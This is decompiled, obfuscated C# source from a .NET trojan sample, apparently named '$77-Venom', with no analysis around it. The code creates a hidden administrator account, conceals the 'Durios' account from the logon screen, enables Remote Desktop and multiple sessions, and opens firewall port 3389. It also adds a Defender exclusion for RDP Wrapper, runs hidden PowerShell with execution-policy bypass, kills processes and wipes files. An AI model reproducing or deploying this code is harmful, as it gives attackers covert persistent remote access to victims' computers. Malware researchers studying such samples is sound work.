// Decompiled with JetBrains decompiler
// Type: 墖鲅썺蝜奷諐뀰韠句뿶씿胗䞛鮝嫶
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;
using System.ServiceProcess;

public class 墖鲅썺蝜奷諐뀰韠\uF0A9句뿶\uEC64씿胗\uE1E6䞛\uE449鮝\uE057嫶
{
  public static bool 抿鷯ᠽꞗ槟Ճ璪\uE6AA풅ퟒ剒戌\uFFFD䊇\uE09A枱ꪢ쏚\uA7BEट(string name)
  {
    墖鲅썺蝜奷諐뀰韠\uF0A9句뿶\uEC64씿胗\uE1E6䞛\uE449鮝\uE057嫶.ᇉ㒚೭럭툴䖙띰눼䮂䛴Ⳇ簍改뗘禯펺딴䔤\uF06A㕧();
    Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
    Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true).SetValue("dontdisplaylastusername", (object) 1);
    ProcessStartInfo processStartInfo1 = new ProcessStartInfo("cmd.exe", "/c net user " + name + " " + name + " /add");
    processStartInfo1.CreateNoWindow = true;
    processStartInfo1.RedirectStandardOutput = true;
    processStartInfo1.RedirectStandardError = true;
    processStartInfo1.UseShellExecute = false;
    Process process1 = new Process();
    process1.StartInfo = processStartInfo1;
    process1.Start();
    string end1 = process1.StandardOutput.ReadToEnd();
    process1.WaitForExit();
    if (end1 == null || !end1.ToLower().Contains("command completed successfully."))
      return false;
    ProcessStartInfo processStartInfo2 = new ProcessStartInfo("cmd.exe", "/c net localgroup administrators " + name + " /add");
    processStartInfo2.CreateNoWindow = true;
    processStartInfo2.RedirectStandardOutput = true;
    processStartInfo2.RedirectStandardError = true;
    processStartInfo2.UseShellExecute = false;
    Process process2 = new Process();
    process2.StartInfo = processStartInfo2;
    process2.Start();
    string end2 = process2.StandardOutput.ReadToEnd();
    process2.WaitForExit();
    return end2 != null && end2.ToLower().Contains("command completed successfully.");
  }

  public static void 䴩\uFFFDM\uF54C颥膡臡嘛\uFFFD랒Ȕ\uFFFD\uE43E崀ฐㇱ饄\uF3DAꁁ鬹()
  {
    new ServiceController("TermService").Stop();
    墖鲅썺蝜奷諐뀰韠\uF0A9句뿶\uEC64씿胗\uE1E6䞛\uE449鮝\uE057嫶.Đ⃛ﵛ㚡䭓쓯ĸ宥蚫\u2F6C볿鰑툪ㅧ또혟腏촑\u2AFA佊();
    墖鲅썺蝜奷諐뀰韠\uF0A9句뿶\uEC64씿胗\uE1E6䞛\uE449鮝\uE057嫶.\uE889ശ\u2129\uEB8Dᝦ儸屹\uE89B\u2581ॱḱ\uAA4F㭉ꪨ鿏쟪뀣㰘媮ꥱ();
    string str = "C:\\Program Files\\RDP Wrapper\\uninstall.bat";
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b powershell " + str + " & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    string path = "C:\\Program Files\\RDP Wrapper";
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b del /q/f/s " + path + " & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Directory.Delete(path, true);
    墖鲅썺蝜奷諐뀰韠\uF0A9句뿶\uEC64씿胗\uE1E6䞛\uE449鮝\uE057嫶.\u2106獪\uEB5A䫒\uEBD1瞌\u2513틬輏饢拱늗媘깞㓪ꟾ\u2B20쓩\uF2C3\uF28E();
    File.SetAttributes(path, FileAttributes.Normal);
    File.Delete(path);
  }

  public static void \u2106獪\uEB5A䫒\uEBD1瞌\u2513틬輏饢拱늗媘깞㓪ꟾ\u2B20쓩\uF2C3\uF28E()
  {
    if (File.Exists("C:\\Program Files\\RDP Wrapper\\rdpwrap.dll"))
    {
      try
      {
        File.Delete("C:\\Program Files\\RDP Wrapper\\rdpwrap.ini");
      }
      catch (IOException ex)
      {
        Console.WriteLine(ex.Message);
        return;
      }
    }
    FileInfo fileInfo = new FileInfo("C:\\Program Files\\RDP Wrapper\\rdpwrap.dll");
    try
    {
      fileInfo.Delete();
    }
    catch (IOException ex)
    {
      Console.WriteLine(ex.Message);
    }
    try
    {
      Directory.Delete("C:\\Program Files\\RDP Wrapper");
    }
    catch (IOException ex)
    {
      Console.WriteLine(ex.Message);
    }
    if (Directory.Exists("C:\\Program Files\\RDP Wrapper"))
    {
      try
      {
        Directory.Delete("C:\\Program Files\\RDP Wrapper", true);
      }
      catch (IOException ex)
      {
        Console.WriteLine(ex.Message);
      }
    }
    DirectoryInfo directoryInfo = new DirectoryInfo("C:\\Program Files\\RDP Wrapper");
    try
    {
      directoryInfo.Delete(true);
    }
    catch (IOException ex)
    {
      Console.WriteLine(ex.Message);
    }
    string path = "C:\\Program Files\\RDP Wrapper";
    FileSecurity accessControl = File.GetAccessControl(path);
    SecurityIdentifier user = WindowsIdentity.GetCurrent().User;
    accessControl.SetOwner((IdentityReference) user);
    accessControl.SetAccessRule(new FileSystemAccessRule((IdentityReference) user, FileSystemRights.FullControl, AccessControlType.Allow));
    File.SetAccessControl(path, accessControl);
    File.Delete(path);
  }

  public static void \uE889ശ\u2129\uEB8Dᝦ儸屹\uE89B\u2581ॱḱ\uAA4F㭉ꪨ鿏쟪뀣㰘媮ꥱ() => Process.Start(new ProcessStartInfo()
  {
    FileName = "cmd",
    Arguments = "/k start /b del /q/f/s %TEMP%\\* & exit",
    CreateNoWindow = true,
    WindowStyle = ProcessWindowStyle.Hidden,
    UseShellExecute = true,
    ErrorDialog = false
  });

  public static bool Đ⃛ﵛ㚡䭓쓯ĸ宥蚫\u2F6C볿鰑툪ㅧ또혟腏촑\u2AFA佊()
  {
    string str1 = "cmd";
    string str2 = "conhost";
    string str3 = "installrdp";
    string str4 = "rdpinstall";
    string str5 = "updaterdp";
    foreach (Process process in Process.GetProcesses())
    {
      if (process.MainWindowTitle.Contains(str1))
      {
        process.Kill();
        return true;
      }
    }
    foreach (Process process in Process.GetProcesses())
    {
      if (process.MainWindowTitle.Contains(str5))
      {
        process.Kill();
        return true;
      }
    }
    foreach (Process process in Process.GetProcesses())
    {
      if (process.MainWindowTitle.Contains(str4))
      {
        process.Kill();
        return true;
      }
    }
    foreach (Process process in Process.GetProcesses())
    {
      if (process.MainWindowTitle.Contains(str3))
      {
        process.Kill();
        return true;
      }
    }
    foreach (Process process in Process.GetProcesses())
    {
      if (process.MainWindowTitle.Contains(str2))
      {
        process.Kill();
        return true;
      }
    }
    return false;
  }

  public static void ᇉ㒚೭럭툴䖙띰눼䮂䛴Ⳇ簍改뗘禯펺딴䔤\uF06A㕧()
  {
    RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", true);
    if (registryKey1 == null)
    {
      Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey1 = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", true);
      registryKey1.SetValue("fDenyTSConnections", (object) 0);
    }
    else
      registryKey1.SetValue("fDenyTSConnections", (object) 0);
    registryKey1.Flush();
    RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", true);
    if (registryKey2 == null)
    {
      Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey2 = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", true);
      registryKey2.SetValue("UserAuthentication", (object) 1);
    }
    else
      registryKey2.SetValue("UserAuthentication", (object) 1);
    registryKey2.Flush();
    RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", true);
    if (registryKey3 == null)
    {
      Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey3 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", true);
      registryKey3.SetValue("fSingleSessionPerUser", (object) 0);
    }
    else
      registryKey3.SetValue("fSingleSessionPerUser", (object) 0);
    registryKey3.Flush();
    RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", true);
    if (registryKey4 == null)
    {
      Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey4 = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", true);
      registryKey4.SetValue("fSingleSessionPerUser", (object) 0);
    }
    else
      registryKey4.SetValue("fSingleSessionPerUser", (object) 0);
    registryKey4.Flush();
    try
    {
      RegistryKey registryKey5 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", true);
      if (registryKey5 != null && registryKey5.GetValue("Durios") != null)
        registryKey5.SetValue("Durios", (object) "0");
      Console.WriteLine("Durios desactivated");
    }
    catch (Exception ex)
    {
      墖鲅썺蝜奷諐뀰韠\uF0A9句뿶\uEC64씿胗\uE1E6䞛\uE449鮝\uE057嫶.䢾\uF064霪伲妾軶踥䛒븱\uFE55큌者移牆㙹\u0E6E錑䲫南莰("New-ItemProperty -Path HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList -Name Durios -PropertyType DWord -Value 0 -Force");
    }
    RegistryKey registryKey6 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", true);
    if (registryKey6 == null)
    {
      Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey6 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", true);
      registryKey6.SetValue("Durios", (object) 0);
    }
    else
      registryKey6.SetValue("Durios", (object) 0);
    registryKey6.Flush();
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -Command Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -Command netsh advfirewall firewall add rule name='allow RemoteDesktop' dir=in protocol=TCP localport=3389 action=allow & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath %ProgramFiles%\\RDP Wrapper & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
  }

  private static void 䢾\uF064霪伲妾軶踥䛒븱\uFE55큌者移牆㙹\u0E6E錑䲫南莰(string args) => new Process()
  {
    StartInfo = new ProcessStartInfo()
    {
      FileName = "powershell",
      Arguments = args,
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true
    }
  }.Start();
}
